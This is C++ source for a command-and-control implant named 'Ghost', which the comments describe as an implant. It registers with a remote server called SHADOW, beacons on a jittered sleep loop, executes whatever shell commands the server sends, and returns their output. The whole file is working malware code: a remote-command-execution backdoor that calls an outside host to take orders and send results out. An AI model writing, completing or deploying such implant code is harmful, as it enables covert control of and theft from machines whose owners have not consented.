#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>

#include "apiSchema.hpp"
#include "config.hpp"
#include "httpClient.hpp"
#include "utils.hpp"

class Ghost {
private:
    std::string uuid;
    std::string hostname;

    HttpClient client;
    int currentSleepInterval;
    int currentJitterPercent;

    std::vector<TaskResultDto> pendingResults;

public:
    // a potential problem with UUID arises if the implant gets reinstalled
    // it'll cause it to generate a new uuid
    // SHADOW won't know it's the same one
    // TODO: how to combat this?
    Ghost(std::string ip, int port)
        : uuid(Utils::generateUuid()),
        hostname(Utils::getHostname()),
        client(ip, port),
        currentSleepInterval(DEFAULT_SLEEP_SEC),
        currentJitterPercent(JITTER_PERCENT) {}

    bool registerGhost() {
        std::cout << "[GHOST] trying to register with SHADOW\n";

        GhostDto registrationPayload;
        registrationPayload.id = uuid;
        registrationPayload.hostname = hostname;
        registrationPayload.os = OS_PLATFORM;

        std::string response = client.sendHttpRequest("POST", "/api/v1/ghost/register", registrationPayload.toJson());

        // TODO: ideally get back some sort of a config, but for now just get any data
        // TODO: make this check the reponse code instead
        if (!response.empty()) {
            std::cout << "REGISTRATION SUCCESSFUL\n";
            return true;
        }

        return false; 
    }

    void beacon() {
        std::cout << "[GHOST] starting the beacon\n";

        while (true) {
            std::cout << "[beacon] pulse sent\n";
            
            HeartbeatRequestDto heartbeat;
            heartbeat.id = uuid;
            heartbeat.results = pendingResults;

            std::string rawResponse = client.sendHttpRequest("POST", "/api/v1/ghost/heartbeat", heartbeat.toJson());
            
            if (!rawResponse.empty()) {
                pendingResults.clear();

                HeartbeatResponseDto instructions = HeartbeatResponseDto::fromJson(rawResponse);
                std::cout << "WOW " << instructions.sleepInterval << " " << instructions.jitterPercent << " " << instructions.tasks.size() << "\n";

                if (instructions.sleepInterval > 0) {
                    currentSleepInterval = instructions.sleepInterval;
                }
                if (instructions.jitterPercent > 0) {
                    currentJitterPercent = instructions.jitterPercent;
                }

                if (!instructions.tasks.empty()) {
                    std::cout << "RECEIVED " << instructions.tasks.size() << " tasks\n";

                    for (const auto& task : instructions.tasks) {
                        processTask(task);
                    }
                }
            } else {
                std::cout << "ERROR connection failed or empty response\n";
            }

            sleepWithJitter();
        }
    }

private:
    void processTask(const TaskDefinitionDto& task) {
        std::cout << "GHOST executing task " << task.command << "\n";

        TaskResultDto result;
        result.taskId = task.id;

        result.output = Utils::executeCommand(task.command + " " + task.args);
        result.status = "completed";
        
        pendingResults.push_back(result);
    }

    void sleepWithJitter() {
        int jitterSec = (currentSleepInterval * currentJitterPercent) / 100;
        int variance = (rand() % (jitterSec * 2 + 1)) - jitterSec;
        int finalSleep = currentSleepInterval + variance;

        if (finalSleep < 0) {
            finalSleep = 0;
        }

        std::this_thread::sleep_for(std::chrono::seconds(finalSleep));
    }
};

int main() {
    srand(time(0));

    std::cout << "GHOST UP on \"" << OS_PLATFORM << "\"" << std::endl;

    Ghost ghost(SHADOW_IP, SHADOW_PORT);

    // try to register with SHADOW
    while (!ghost.registerGhost()) {
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }

    // for now just beacon
    ghost.beacon();

    return 0;
}
